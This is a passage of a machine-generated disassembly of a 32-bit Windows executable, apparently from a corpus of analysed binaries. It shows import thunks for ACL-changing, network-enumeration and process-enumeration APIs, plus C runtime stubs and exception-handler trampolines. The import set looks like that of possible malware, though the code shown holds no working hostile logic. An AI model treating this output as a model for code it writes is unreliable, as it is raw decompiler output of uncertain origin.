mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetGetDCName
jmp [ NetGetDCName@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strlen
jmp [ strlen@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
memcmp
jmp [ memcmp@IAT ]
strcmp
jmp [ strcmp@IAT ]
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
sub_407f41
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_407f5a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_407f6c
xor eax eax
retn
sub_407f6f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_407f94
mov eax r--data
jmp __CxxFrameHandler
sub_407fa0
mov eax r--data
jmp __CxxFrameHandler
sub_407fac
mov eax r--data
jmp __CxxFrameHandler
sub_407fb8
mov eax r--data
jmp __CxxFrameHandler
sub_407fc4
mov eax r--data
jmp __CxxFrameHandler
sub_407fd0
mov eax r--data
jmp __CxxFrameHandler
sub_407fdc
mov eax r--data
jmp __CxxFrameHandler
sub_407fe8
mov eax r--data
jmp __CxxFrameHandler
